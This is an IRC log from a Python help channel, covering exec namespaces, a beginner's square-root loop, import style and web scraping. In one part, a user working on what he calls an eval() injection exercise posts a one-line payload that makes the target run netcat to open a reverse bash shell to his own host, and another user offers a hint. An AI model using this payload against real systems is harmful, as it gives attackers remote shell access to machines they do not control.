[22:33:32] *** `7hr3t_hvntr` is now known as `7hr34t_hvntr
[22:33:36] <WhileTrue> bjs, yes, that's what I was referring to
[22:33:46] <bjs> WhileTrue: okay, that was not clear.
[22:34:10] *** Joins: ThiefMaster (thief@indico/developer/thiefmaster)
[22:34:28] <bjs> WhileTrue: I suggest doing this in two stages: first take the program at https://paste.debian.net/plain/1031782 and modify it as little as possible to make it return the final approximation and print it out
[22:34:29] <WhileTrue> nothing I tried helped to display sqrt values for different numbers
[22:34:30] *** Quits: bpremo_ (~bpremo@c-71-196-223-147.hsd1.co.comcast.net) (Ping timeout: 260 seconds)
[22:34:30] *** Quits: derk0pf (~derk0pf@p5497B8F0.dip0.t-ipconnect.de) (Ping timeout: 260 seconds)
[22:34:35] <ali1234> energizer: i have my own class representing the modules, i need to load the module source into an instance of that class instead of types.ModuleType
[22:34:42] <ali1234> that class has properties
[22:34:42] <sartan> if/when using next you have to try/catch on "StopIteration"
[22:34:51] <sartan> in event ther eare no matches
[22:34:57] *** Joins: methyl (~methyl@unaffiliated/methyl)
[22:34:57] <bjs> WhileTrue: do you think you can do the first stage part I just asked?
[22:35:05] <ali1234> properties can only be accessed as obj.property, so inside the module source, just saying "property" won't work
[22:35:37] *** Quits: baxx (~user@2a02:c7f:7a71:3400:3a5f:a59b:ac72:4b71) (Ping timeout: 245 seconds)
[22:35:39] <ali1234> in particular, if you say "property = 123", it won't assign 123 to the property. it will create a new atrribute on the *instance* which shadows the property
[22:35:53] <ali1234> i want to prevent that from happening, preferably as soon as it happens so i get a proper traceback
[22:36:03] <bjs> ali1234: ah, but that doesn't stop you doing fun things: namely populating sys.modules with a bunch of objects that *do* have properties
[22:36:07] *** Joins: streuner (~streuner@gateway/tor-sasl/streuner)
[22:36:12] <ali1234> bjs: i know that
[22:36:22] *** Quits: lorddaed_ (~lorddaedr@78.157.211.238) (Ping timeout: 264 seconds)
[22:36:22] <ali1234> bjs: that is exactly what i am doing
[22:36:23] <WhileTrue> bjs, sure, I can try
[22:36:25] <bjs> ali1234: (but you can't change the meaning of a bare `x = y` )
[22:36:35] <ali1234> bjs: right, but i don't want to change it
[22:36:39] *** Quits: nixjdm (~nixjdm@2605:a601:1135:a400:ac06:7b51:6d64:9e35) (Quit: Leaving)
[22:36:41] <ali1234> bjs: i want to catch when it happens
[22:37:12] <ali1234> but exec can only use a dict for globals so i cant hook into that, because it goes around __setitem__
[22:37:20] <ali1234> however you can use a normal mapping for locals
[22:37:33] <ali1234> and it will use __setitem__ for locals
[22:37:34] *** Quits: LoRez (~LoRez@freenode/staff-emeritus/lorez) (Ping timeout: 264 seconds)
[22:37:34] <bjs> ali1234: hmm, can't you create a dict subclass ?
[22:37:39] <bjs> or does it not call __setitem__
[22:37:46] <ali1234> bjs: yes, but it still won't call __setitem__ on it
[22:38:01] <bjs> ali1234: I assume it calls __getitem__ but not __setitem__ (i'm not sure)
[22:38:07] <ali1234> but on locals it DOES - BUT only if locals != globals
[22:38:14] <ali1234> it calls neither on globals
[22:38:16] <ali1234> both on locals
[22:38:16] *** Parts: opal (~wowaname@ip39.ip-54-36-15.eu) ("i'm never coming back")
[22:38:17] *** Joins: todd_dsm (~todd_dsm@cpe-76-169-244-100.socal.res.rr.com)
[22:38:36] <bjs> ali1234: strange
[22:38:44] <ali1234> yes, that's why i said "exec is puzzling"
[22:38:44] *** Joins: opal (~wowaname@ip39.ip-54-36-15.eu)
[22:38:49] <bjs> WhileTrue: show me whenever you get something and are stuck/got it
[22:39:09] <bjs> ali1234: there's lots of weird things with exec's namespaces iirc
[22:39:10] <ali1234> but here's the thing - if i supply an empty dict for locals, then it should become impossible to shadow properties
[22:39:19] <bjs> ali1234: it comes up now and again and I forget pretty soon after
[22:39:20] <ali1234> i think that should solve my problem
[22:39:21] *** Joins: ace510 (~chatzilla@mobile-166-176-185-202.mycingular.net)
[22:39:34] *** Quits: holden- (~holden-@unaffiliated/holden-) (Remote host closed the connection)
[22:39:35] <Yhg1s> (there's very little weird about exec's namespace, just about *Python*'s namespaces :)
[22:39:52] *** Quits: MrAureliusR (~MrAureliu@2607:fea8:8460:63b::b) (Read error: Connection reset by peer)
[22:39:58] <bjs> Yhg1s: I suppose
[22:40:02] <ali1234> then i should be able to selectively allow what the module can and can't do
[22:40:06] *** Quits: tom__ (~tom@p54B0E142.dip0.t-ipconnect.de) (Quit: Konversation terminated!)
[22:40:13] <bjs> I still think ali1234 must be overcomplicating this design
[22:40:24] *** Joins: MrAureliusR (~MrAureliu@2607:fea8:8460:63b::b)
[22:40:29] <WhileTrue> bjs, sure
[22:40:39] <neobenedict> fixed my problem by installing libssl-dev 1.0.2 from jessie backports
[22:40:42] <ali1234> bjs: how should i do it?
[22:40:53] <energizer> it would be cool if you could make a ChainMap namespace
[22:41:01] <bjs> ali1234: I don't know, the whole project seems overcomplicated :)
[22:41:05] *** Joins: kajo (~kajo@2001:4c50:371d:8400:ca2a:14ff:fe0f:7dd1)
[22:41:07] *** Joins: mrjohns (~juan@unaffiliated/mrjohns)
[22:41:07] <bjs> ali1234: like some kind of weird magical build system iir
[22:41:15] <ali1234> bjs: it's only about 200 lines of code, how can it be complicated?
[22:41:16] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[22:41:21] <ali1234> it's not like it's perl code :)
[22:41:28] <nedbat> ali1234: this is complicated :)
[22:41:41] <_habnabit> ali1234, https://paste.pound-python.org/show/chatserver/ 64 lines
[22:41:58] *** Quits: Alejoux (~Alejoux@2a01:e35:2e59:7ce0:78c8:602d:d850:3491) (Read error: Connection reset by peer)
[22:42:04] <energizer> one line, really
[22:42:10] <ali1234> nice. but i haven't used lambda, nor removed all newlines
[22:42:15] <`7hr34t_hvntr> does __import__("socket");s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) not work on python 2? im getting name 'socket' not defined
[22:42:22] <ali1234> i don't think i used lambda anywhere, there might be one somewhere
[22:42:32] <bjs> `7hr34t_hvntr: what's wrong with `import socket`  (why are you calling __import__ ?)
[22:42:33] *** Quits: Haudegen (~quassel@178.115.237.87) (Read error: Connection reset by peer)
[22:42:37] *** Quits: Nickeeh (~quassel@bulbasaur.sjorsgielen.nl) (Ping timeout: 256 seconds)
[22:42:40] <_habnabit> `7hr34t_hvntr, __import__ doesn't inject into globals
[22:42:55] <`7hr34t_hvntr> ah...
[22:43:23] <nedbat> ali1234: your point is a good one though: it isn't the line count that determines if something is complicated. It's what's in the lines.
[22:43:24] *** Joins: justanotheruser (~justanoth@unaffiliated/justanotheruser)
[22:43:37] <`7hr34t_hvntr> bjs exercise doing code injection into a vulnerable eval() function which should allow arbitrary command exec
[22:43:40] <bjs> nedbat: _habnabit's is terrible on both accounts
[22:43:48] <bjs> no offense _habnabit :)
[22:44:00] <_habnabit> bjs, it was, after all, the point
[22:44:18] <bjs> _habnabit: i'm sure on the *inside* it's a beautiful chat server
[22:44:22] <squirrel> what's the greatest python question of all time?
[22:44:25] *** Quits: znpy (~znpy@93-50-112-244.ip152.fastwebnet.it) (Ping timeout: 260 seconds)
[22:44:28] <bjs> squirrel: "greatest" ?
[22:44:31] <ali1234> bjs: so you still haven't explained how to do what i want some simpler way....
[22:44:37] <squirrel> yes, greatest
[22:44:43] <bjs> ali1234: I still don't really know what you want...
[22:44:55] *** Quits: techalchemy (~Hawkerz@unaffiliated/hawkerz) (Quit: Leaving)
[22:44:56] <nedbat> ali1234: who said there was a simpler way to do it? Perhaps your goal is inherently complicated
[22:45:09] <bjs> ali1234: there's a lot of "Inject stuff into modules to get magical globals that are descriptors so I can ... do something?"
[22:45:20] <ali1234> bjs: no, there is no injection any more
[22:45:23] <bjs> oh
[22:45:35] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 240 seconds)
[22:45:35] <ali1234> bjs: actually now i have the opposite problem: i want to PREVENT that stuff from being visible to the module
[22:45:45] <ali1234> but that is harder than it looks
[22:45:51] <_habnabit> bjs, it doesn't use twisted
[22:46:01] <Hello71> `7hr34t_hvntr: does it not take new lines
[22:46:04] <_habnabit> ali1234, only import what you want
[22:46:06] *** Parts: |oLa| (~|_oLa_|@2a00:23c5:8c0e:9900:d996:2f3e:f2a7:86e6) ()
[22:46:10] *** Quits: methyl (~methyl@unaffiliated/methyl) (Ping timeout: 260 seconds)
[22:46:14] <ali1234> _habnabit: that's what i do
[22:46:27] *** Quits: chachan (~chachan@196.40.47.129) (Ping timeout: 240 seconds)
[22:46:37] <bjs> ali1234: so you want to be able to ... import it but not import it? I'm not sure what you want
[22:46:48] <_habnabit> ali1234, what is it that's too visible?
[22:46:59] <`7hr34t_hvntr> Hello71, ah.. didn't try that..
[22:46:59] <Hello71> _habnabit: at that point might as well import zlib and base64 and compress the whole thing
[22:47:25] *** Joins: felbx (744b67c6@gateway/web/cgi-irc/kiwiirc.com/ip.116.75.103.198)
[22:47:25] *** Joins: LER0ever (~LER0ever@50.93.222.130)
[22:47:29] <ali1234> _habnabit: variables defined in the module that have the same name as a property on the module instance
[22:47:43] <WhileTrue> bjs, this gives the final result: https://paste.debian.net/1031783/
[22:47:49] *** Quits: LER0ever (~LER0ever@50.93.222.130) (Remote host closed the connection)
[22:48:09] <ali1234> _habnabit: ideally i want to raise a syntax error if the user tries to define one
[22:48:25] <bjs> WhileTrue: that's good, but i think we still want to make 1 small change to it, instead of print() *inside* mysqrt(), it would be better if mysqrt() *returned* the value (like math.sqrt does)
[22:48:27] <felbx> Please any idea where to find python related job without qualification?
[22:48:30] *** Quits: palasso (~palasso@unaffiliated/palasso) (Quit: I am not a quiter!)
[22:48:31] *** Joins: WBILL (~WBILL@96-38-107-68.dhcp.jcsn.tn.charter.com)
[22:48:33] <ali1234> making them be local - ie not exported - might work too
[22:48:36] <bjs> WhileTrue: and then you do print(mysqrt(25, 6))
[22:48:45] <bjs> WhileTrue: can you do that?
[22:49:07] *** Quits: lorddaedra (~lorddaedr@78.157.211.238) (Read error: Connection timed out)
[22:49:07] <ali1234> i prefer the former though as it is less surprising later
[22:49:09] <energizer> what kind of sqrt takes two arguments
[22:49:26] <bjs> energizer: the numerical approximation kind that has an initial value
[22:49:36] <energizer> bjs: i see
[22:49:45] <bjs> energizer: (just go with it, WhileTrue is new)
[22:49:54] <energizer> bjs: sounds good :)
[22:50:15] *** Quits: willmont (~willmont3@2601:280:4900:4a72:946c:9800:fd9c:f0d3) (Ping timeout: 245 seconds)
[22:50:21] *** Joins: lorddaedra (~lorddaedr@78.157.211.238)
[22:50:57] *** Quits: tty01 (186996e2@gateway/web/cgi-irc/kiwiirc.com/ip.24.105.150.226) (Ping timeout: 240 seconds)
[22:51:16] <WhileTrue> bjs, sure
[22:51:17] *** Parts: felbx (744b67c6@gateway/web/cgi-irc/kiwiirc.com/ip.116.75.103.198) ()
[22:51:25] <bjs> WhileTrue: okay, do that then show me it :)
[22:51:34] *** Quits: GiLgAmEzH (~gilgamezh@unaffiliated/gilgamezh) (Ping timeout: 268 seconds)
[22:51:48] *** Quits: sydbarret (~Username@unaffiliated/sydbarret) (Quit: Going offline, see ya! (www.adiirc.com))
[22:52:04] *** Joins: nopf (~frosch@felderundfiguren.de)
[22:54:20] *** Quits: aielima_ (~aielima@gateway/tor-sasl/aielima) (Quit: Leaving)
[22:54:22] *** Quits: Darkhunter (~mmojzis@static-84-42-152-237.net.upcbroadband.cz) (Quit: Leaving.)
[22:54:41] *** Joins: himcesjf_ (~cesjf@unaffiliated/himcesjf)
[22:54:55] *** Quits: him-cesjf (~cesjf@unaffiliated/himcesjf) (Ping timeout: 260 seconds)
[22:55:01] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[22:55:27] *** Quits: m3ddl3r (~Thunderbi@192.30.201.10) (Ping timeout: 240 seconds)
[22:55:35] *** Quits: stranac (~stranac@89-172-229-114.adsl.net.t-com.hr) (Read error: Connection reset by peer)
[22:55:38] *** Joins: jwarren (43aa56c5@gateway/web/freenode/ip.67.170.86.197)
[22:56:06] *** Quits: mnemonic (~semeion@unaffiliated/semeion) (Read error: Connection reset by peer)
[22:56:47] *** Joins: ellcs (~ellcs@200116b8683c1f0062f677fffebe55f5.dip.versatel-1u1.de)
[22:57:20] <sine0> I want to creat a k,v array from lists and they are not static in size of key names. I have the list and I can itterate from through loop, but im not sure how to create a k,v array, would it be a dictionary
[22:58:17] *** Quits: dimitrovskif (~dimitrovs@89.205.68.164) (Ping timeout: 256 seconds)
[22:58:23] <WhileTrue> bjs, does this look like the one you're referring to: https://paste.debian.net/plain/1031791 ?
[22:58:44] <nedbat> WhileTrue: that is good, it's returning the value.
[22:58:48] <bjs> WhileTrue: yeah that looks good!
[22:58:54] *** Parts: electricbear (~electricb@unaffiliated/electricbear) ("Leaving")
[22:58:56] *** Quits: Afrix (~Afrix4@host-92-6-26-221.as43234.net) (Quit: Leaving)
[22:59:10] <nedbat> WhileTrue: can you think of a better first guess for the square root than 6?
[22:59:35] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 260 seconds)
[22:59:48] *** Quits: Vornotron (~Vorn@2605:e000:1218:48d:9cb:b682:cdd2:e245) (Ping timeout: 265 seconds)
[23:00:00] <WhileTrue> nedbat, not right away, but I can try other values to see how many iterations it takes to get to 5
[23:00:17] <WhileTrue> of course, the closer to 5, the better
[23:00:38] <WhileTrue> well, 4 is better than 6
[23:02:05] <WhileTrue> interestingly, with 4 it takes one iteration more
[23:02:06] *** Quits: ytrezq (~0x0EDFADE@lcs07-lyo-176-188-198-28.sfr.lns.abo.bbox.fr) (Read error: Connection reset by peer)
[23:02:20] <`7hr34t_hvntr> Hello71, i think my solution lies here
[23:02:22] <`7hr34t_hvntr> https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html
[23:02:32] <bjs> WhileTrue: I think nedbat meant, "in general", for any a, what is a good approximation for x  (6 is probably not a good starting point if you want mysqrt(256)
[23:02:35] <sine0> 7 lines of code, is there a neater way ? https://paste.pound-python.org/show/L19fasrG7he8VcLQRZJy/
[23:02:50] *** Joins: theseb (~user@47-220-211-42.cnrocmta03.res.dyn.suddenlink.net)
[23:03:11] <nedbat> WhileTrue: the good news is that you will find the square root with any first guess, i think.
[23:03:31] <bjs> WhileTrue: but maybe we should move on, what was the second part of your problem?
[23:03:48] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[23:03:52] <bjs> WhileTrue: If I recall correctly it was to print all the sqrts between 1-9 or something?
[23:03:56] *** Quits: fikka (~fikka@5403BEC5.catv.pool.telekom.hu) (Ping timeout: 276 seconds)
[23:03:57] *** Joins: Radicarianubis (~Radicaria@cpe-72-231-246-183.buffalo.res.rr.com)
[23:03:59] <WhileTrue> bjs, yes,
[23:04:14] <WhileTrue> here one needs a generally good starting value
[23:04:28] <bjs> WhileTrue: yes, and a good way to "end"
[23:04:39] *** Quits: SkyLeach (~skyleach@2001:420:c0c4:1008::2a7) ()
[23:04:39] *** Quits: vyraeden (~vyraeden@85.108.109.203) (Remote host closed the connection)
[23:04:53] <bjs> WhileTrue: (the diff you were talking about earlier)
[23:05:03] <WhileTrue> yes
[23:05:17] *** Joins: cseder (~textual@2001:4664:2f0a:0:f007:7dcb:ed4e:39f0)
[23:05:48] *** Quits: scampbell (~scampbell@mail.scampbell.net) (Quit: Leaving)
[23:06:00] *** Quits: Kundry_Wag (~Kundry_Wa@186.214.80.183) (Ping timeout: 260 seconds)
[23:06:08] *** Quits: puff (~user@pool-72-77-34-186.pitbpa.fios.verizon.net) (Ping timeout: 255 seconds)
[23:06:18] *** Joins: scampbell (~scampbell@mail.scampbell.net)
[23:06:31] *** Quits: todd_dsm (~todd_dsm@cpe-76-169-244-100.socal.res.rr.com) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[23:06:45] <bjs> WhileTrue: so let's take the first one first: can you get this code to now print the square roots of numbers between 1-9 in a loop? Again you only need another small change to this code to make that wrok
[23:06:46] <bjs> work*
[23:06:53] *** AndroidKitKat is now known as Memekely
[23:07:32] *** Quits: _Coffee (~quassel@2607:fea8:705f:f096:61a0:acb4:e199:a7c1) (Ping timeout: 265 seconds)
[23:07:50] <WhileTrue> bjs, sure
[23:07:57] <cseder> !coffee
[23:08:09] <ali1234> coool it works :D
[23:08:55] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 260 seconds)
[23:09:06] *** Memekely is now known as AndroidKitKat
[23:09:08] *** Joins: holden- (~holden-@unaffiliated/holden-)
[23:10:34] *** Joins: Nickeeh (~quassel@bulbasaur.sjorsgielen.nl)
[23:11:05] *** Joins: derk0pf (~derk0pf@p5497B8F0.dip0.t-ipconnect.de)
[23:11:12] *** Quits: jlf (~jlf@pdpc/supporter/active/jlf) (Ping timeout: 256 seconds)
[23:11:24] *** Quits: renlo (~lhoward@4.14.106.6) (Ping timeout: 265 seconds)
[23:12:06] <sine0> ok so using bs4, find i need data that is obtained from js. whats next
[23:12:24] *** Joins: chachan (~chachan@168.232.28.50)
[23:12:36] <nedbat> sine0: figure out where the js got the data
[23:12:41] <_habnabit> sine0, bs is an html parser; you'd need to emulate the js somehow or run it with a browser
[23:13:03] *** Quits: graphene (~graphene@46.101.134.251) (Read error: Connection reset by peer)
[23:13:10] *** Quits: loader (~loader@81.19.4.181) (Read error: Connection reset by peer)
[23:13:40] *** Joins: renlo (~lhoward@4.14.106.6)
[23:13:47] *** Joins: graphene (~graphene@46.101.134.251)
[23:13:54] *** Quits: Norore (~Norore@mic92-8-82-230-161-45.fbx.proxad.net) (Quit: WeeChat 1.4)
[23:14:20] *** Quits: rsrx (~rsrx@cable-94-189-226-199.dynamic.sbb.rs) (Read error: Connection reset by peer)
[23:14:41] *** Joins: acdw (~case@2600:8807:284:c000:4fc1:bb4:baf8:bc9e)
[23:15:31] *** Joins: adamholmberg (~adamholmb@69.80.114.120)
[23:15:40] <sine0> i like the sound of both of those suggestions
[23:16:01] <nedbat> sine0: they are very different :)
[23:16:29] *** Quits: rjdp9736 (~rjdp9736@183.82.17.102) (Quit: My MacBook Air has gone to sleep. ZZZzzz…)
[23:16:30] <sine0> I would guess the js would be using ajax
[23:17:05] *** Quits: acdw (~case@2600:8807:284:c000:4fc1:bb4:baf8:bc9e) (Client Quit)
[23:17:27] *** Quits: malachi (~malconten@91.207.175.200) (Quit: Leaving)
[23:17:30] *** Joins: rjdp9736 (~rjdp9736@183.82.17.102)
[23:17:33] *** Joins: acdw (~case@2600:8807:284:c000:4fc1:bb4:baf8:bc9e)
[23:18:56] *** Quits: singularity00 (~singulari@85.187.64.126.client.entry.bg) (Quit: The true sign of intelligence is not knowledge but imagination.)
[23:19:14] *** Quits: gmcastil (041f0d11@gateway/web/freenode/ip.4.31.13.17) (Ping timeout: 260 seconds)
[23:19:33] *** Joins: znpy (~znpy@93-50-112-244.ip152.fastwebnet.it)
[23:19:45] *** Joins: rpg (~rpg@162-219-230-36.fttp.usinternet.com)
[23:19:49] *** Quits: Wulf (~Wulf@unaffiliated/wulf) (Ping timeout: 256 seconds)
[23:20:05] *** Quits: Adam_eM (~adam@31-178-184-139.dynamic.chello.pl) (Ping timeout: 240 seconds)
[23:20:08] *** Quits: kajo (~kajo@2001:4c50:371d:8400:ca2a:14ff:fe0f:7dd1) (Ping timeout: 256 seconds)
[23:20:35] *** Quits: rjdp9736 (~rjdp9736@183.82.17.102) (Client Quit)
[23:20:38] *** Joins: jlf_ (~jlf@2600:1700:df70:d6d0:750b:497d:948f:9534)
[23:20:51] *** Joins: Draecos (~Draecos@203.121.220.138)
[23:21:10] *** Quits: adamholmberg (~adamholmb@69.80.114.120) (Ping timeout: 260 seconds)
[23:21:23] *** Quits: im0nde (~im0nde@2a0a-a540-edb0-0-3889-c878-9b67-5ba0.ipv6dyn.netcologne.de) (Ping timeout: 276 seconds)
[23:21:40] *** Joins: rjdp9736 (~rjdp9736@183.82.17.102)
[23:22:01] *** Joins: __charly__ (~charly@104-184-3-192.lightspeed.austtx.sbcglobal.net)
[23:22:07] <ali1234> i need to catch an exception and print only the second to last item in the traceback
[23:22:27] *** Joins: kajo (~kajo@2001:4c50:371d:8400:ca2a:14ff:fe0f:7dd1)
[23:22:42] *** Quits: ellcs (~ellcs@200116b8683c1f0062f677fffebe55f5.dip.versatel-1u1.de) (Ping timeout: 245 seconds)
[23:23:59] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[23:24:08] <energizer> ali1234: extract_tb()?
[23:24:17] <ali1234> yeah, reading about that right now
[23:24:19] *** Joins: amikrop (0255c8c9@gateway/web/freenode/ip.2.85.200.201)
[23:24:33] *** Quits: Draecos (~Draecos@203.121.220.138) (Client Quit)
[23:24:41] *** Joins: Trick14 (~dabooz@d54C0FA5E.access.telenet.be)
[23:25:28] <_habnabit> ali1234, what are you trying to elide?
[23:25:39] <`7hr34t_hvntr> Hello71, echo '__import__("os").system("/bin/nc 172.16.2.2 9955 -e /bin/bash")'| nc 172.16.2.25 [port]
[23:25:42] <`7hr34t_hvntr> dunder ftw :D
[23:26:04] <ali1234> _habnabit: well, i did that "load module with a local dict" thing to catch syntax errors in my script files
[23:26:07] <amikrop> How do I decide if I use "from foo import, bar, baz" or "import foo" and then use foo.bar and foo.baz? I use whichever results in less total characters?
[23:26:09] <Hello71> whatever
[23:26:17] <`7hr34t_hvntr> Hello71, that's my policy
[23:26:33] <nedbat> amikrop: "import foo" will result in fewer circular imports
[23:26:35] <_habnabit> ali1234, 'import foo' doesn't necessarily make foo.bar, foo.baz available
[23:26:46] <Hello71> also you may not want to from http import client
[23:26:49] <amikrop> _habnabit: lets assue it does in our case
[23:26:51] <ali1234> _habnabit: that's not the point
[23:26:57] <amikrop> assume
[23:27:02] <_habnabit> ali1234, what's not the point?
[23:27:07] <_habnabit> oh
[23:27:08] <_habnabit> mistab
[23:27:14] <ali1234> oh k
[23:27:22] <amikrop> nedbat: how so?
[23:27:24] <ali1234> _habnabit: just doing a paste
[23:27:50] <energizer> nedbat: "import foo" will result in fewer circular imports ?
[23:28:00] <nedbat> amikrop: "from foo import bar" means that bar has to be available when the import line is run.  "import foo; ... foo.bar" means that bar has to be available when "foo.bar" is run
[23:28:04] <_habnabit> energizer, 'from' imports are the direct cause of circular imports
[23:28:14] <nedbat> amikrop: it's not fewer circular imports, it's fewer errors due to circular imports, sorry
[23:28:19] *** Joins: Arcaelyx (~Arcaelyx@2604:2000:f14a:2500:bc1d:9874:a2fa:33a9)
[23:28:59] <amikrop> nedbat: how the appearance of foo.bar causes circular imports?
[23:29:00] *** Joins: jin23lee (~jin23lee@209.197.26.74)
[23:29:06] <neobenedict> what is a circular import
[23:29:10] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 264 seconds)
[23:29:24] <ali1234> _habnabit: https://paste.pound-python.org/show/1FjzDxZAYdAupCcF7vJO/
[23:29:35] <nedbat> amikrop: it doesn't cause a circular import.  It can cause an error if it's part of a circular import
[23:29:46] <nedbat> neobenedict: module A wants something from B, and B wants something from A
[23:29:49] *** Quits: corretico (~corretico@200.91.143.34) (Ping timeout: 268 seconds)
[23:29:54] <neobenedict> o
[23:29:59] <amikrop> nedbat: I guess that never happens in stdlib
[23:30:04] *** Quits: WBILL (~WBILL@96-38-107-68.dhcp.jcsn.tn.charter.com) (Quit: Leaving)
[23:30:10] <amikrop> nedbat: I mean if foo is an stdlib module
[23:30:33] <amikrop> if it is, then whats or criterion?
[23:30:35] <_habnabit> amikrop, stdlib modules don't import user modules, no
[23:30:37] <amikrop> our*
[23:30:44] <nedbat> amikrop: then it depends on which is more readable
[23:30:44] <energizer> amikrop: maximize clarity for the reader
[23:30:59] <ali1234> _habnabit: i gather this is the purpose of _bootstrap._call_without_frames but it does not seem to work when i use it, probaly due to the magic
[23:31:05] *** Quits: Narrat (~Narrat@p5DED151C.dip0.t-ipconnect.de) (Quit: They say a little knowledge is a dangerous thing, but it's not one half so bad as a lot of ignorance.)
[23:31:07] <amikrop> ok, what would be more readable then? the first or the second case?
[23:31:14] *** Joins: fikka (~fikka@5403BEC5.catv.pool.telekom.hu)
[23:31:15] <amikrop> how do I judge what is more readable?
[23:31:43] *** Quits: TidB (~TidB@pD9FCEBC9.dip0.t-ipconnect.de) (Ping timeout: 256 seconds)
[23:31:50] <nedbat> amikrop: there's no simple answer to that.
[23:31:59] <nedbat> amikrop: i would say if you an unsure, then use "import foo"
[23:32:03] *** Quits: }ls{ (~kalle@unaffiliated/ls/x-8089558) (Quit: real life interrupt)
[23:32:15] <nedbat> amikrop: then it is clear later when you use foo
[23:32:15] *** Quits: njbair (~njbair@2605:a000:122d:c254:227:eff:fe0a:b289) (Excess Flood)
[23:32:31] <amikrop> I see, thanks
[23:32:36] *** Joins: njbair (~njbair@2605:a000:122d:c254:227:eff:fe0a:b289)
[23:32:49] <_habnabit> ali1234, catch it in the importer, report the traceback, and exit(1) cleanly
[23:33:09] <sine0> nedbat: i found a stack post that taught me about the network debug, I found a js xhr called ?action=related_products and the result is lots of html with all the related product info!
[23:33:27] <ali1234> _habnabit: yes, that's what i'm doing. i need to just get the relevent parts of the traceback
[23:33:28] <energizer> amikrop: some objects everybody will know what they are, e.g. OrderedDict
[23:33:29] <nedbat> sine0: nice
[23:33:34] <_habnabit> ali1234, also, python modules assume that locals and globals are the same dict; you'll get some funky breakage otherwise
[23:33:49] <_habnabit> ali1234, this traceback doesn't show that you're catching the exception there
[23:33:54] *** Quits: lorddaedra (~lorddaedr@78.157.211.238) (Read error: Connection reset by peer)
[23:33:59] *** Joins: lorddaed_ (~lorddaedr@185.44.76.121)
[23:34:03] <ali1234> i know, i copied it from an earlier output
[23:34:30] <ali1234> when i catch it i get the same thing except the last tb is "File "<string>", line None"
[23:34:30] <ali1234> "
[23:34:51] <energizer> i never know whether to import `datetime` or `from datetime import datetime`, they're both horrible
[23:34:58] <_habnabit> energizer, import pendulum
[23:35:01] <energizer> i guess the solution is neither
[23:35:03] <energizer> yeah exactly
[23:35:10] <bjs> energizer: i always "from datetime import datetime as dt" or i use arrow or something
[23:35:31] <_habnabit> ali1234, i would recommend not eliding the 'raise' line because having context information in the traceback is invaluable
[23:35:43] *** Joins: im0nde (~im0nde@2a0a-a540-909f-0-744c-c36-5655-5c57.ipv6dyn.netcologne.de)
[23:35:59] *** Quits: amikrop (0255c8c9@gateway/web/freenode/ip.2.85.200.201) (Quit: Page closed)
[23:36:09] *** Quits: jlf_ (~jlf@2600:1700:df70:d6d0:750b:497d:948f:9534) (Quit: Leaving)
[23:36:14] <ali1234> let me do another paste
[23:36:24] *** Quits: Insayne (~Insayne@vodsl-9061.vo.lu) (Quit: Leaving)
[23:36:35] *** Quits: fikka (~fikka@5403BEC5.catv.pool.telekom.hu) (Ping timeout: 268 seconds)
[23:36:39] *** Joins: Technodrome (~textual@unaffiliated/technodrome)
[23:36:54] *** Parts: akar (~user@103.47.132.51) ()
[23:37:22] *** Joins: joebobjoe (~joebobjoe@unaffiliated/joebobjoe)
[23:37:27] <ali1234> _habnabit: btw, immediately after import, i copy the locals into the module dict (assuming no syntax errors) so i think this should be fairly safe?
[23:37:42] *** Joins: akk (~akkana@75.161.148.9)
[23:37:56] <_habnabit> ali1234, you can pass the same dict as both
[23:38:14] <ali1234> _habnabit: if i do that, i cannot monitor __setitem__ and __getitem__ on the dict
[23:38:22] <_habnabit> ali1234, why not?
[23:38:27] *** Quits: mozzarella (~sam@unaffiliated/sam113101) (Ping timeout: 240 seconds)
[23:38:33] *** Quits: r29v (~textual@104.220.154.222) (Quit: r29v)
[23:39:18] <ali1234> _habnabit: because when exec() accesses globals it doesn't use __setitem__ and __getitem__ and if you give it the same dict for locals it just ignores it
[23:39:40] *** Quits: duderonomy (~duderonom@c-73-222-239-211.hsd1.ca.comcast.net) (Ping timeout: 268 seconds)
[23:39:42] *** Quits: njbair (~njbair@2605:a000:122d:c254:227:eff:fe0a:b289) (Excess Flood)
[23:39:50] <WhileTrue> bjs, after all this while: https://paste.debian.net/1031797/
[23:39:55] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[23:39:57] *** Quits: teodorg (~teodorg@85.130.11.102) (Quit: Nettalk6 - www.ntalk.de)
[23:40:05] *** Joins: njbair (~njbair@2605:a000:122d:c254:227:eff:fe0a:b289)
[23:40:06] *** Joins: amikrop (0255c8c9@gateway/web/freenode/ip.2.85.200.201)
[23:40:24] <nedbat> WhileTrue: cool.  you can move the definition of the mysqrt function out of the loop.
[23:40:44] <nedbat> WhileTrue: and the easiest way to loop from 1 to 9 is:   for a in range(1, 10):
[23:41:09] <WhileTrue> ah, "range"
[23:42:00] <ali1234> huh, print_exc actually does something sensible with my code by default. i'll leave it at that
[23:42:00] *** Quits: jamesaxl (~James_Axl@41.249.19.212) (Quit: WeeChat 2.1)
[23:42:08] *** Quits: joebobjoe (~joebobjoe@unaffiliated/joebobjoe) (Ping timeout: 255 seconds)
[23:42:14] <amikrop> What is the order of "from a import b" and "import c" statements, assuming they belong in the same "category" (3rd party imports, or stdlib import, or local imports etc)? Do I put the "from" stuff first, or I mixed them with "import foo", alphabetically?
[23:42:36] <WhileTrue> I wished all the while to have something handy like this that provided these brackets
[23:42:38] *** Quits: diogenese (diogenese@12.172.164.68) (Remote host closed the connection)
[23:42:38] *** Joins: techalchemy (~Hawkerz@unaffiliated/hawkerz)
[23:42:49] *** Quits: roofy (~roofy@2600:1700:89a0:8ae0::45) (Ping timeout: 265 seconds)
[23:42:55] <amikrop> or even the "import c" first, then the "from"s?
[23:43:21] *** Quits: edne (~edne@net-2-42-74-190.cust.vodafonedsl.it) (Ping timeout: 240 seconds)
[23:44:27] *** Quits: derk0pf (~derk0pf@p5497B8F0.dip0.t-ipconnect.de) (Ping timeout: 240 seconds)
[23:44:38] <nedbat> amikrop: i would alphabetize based on the module name
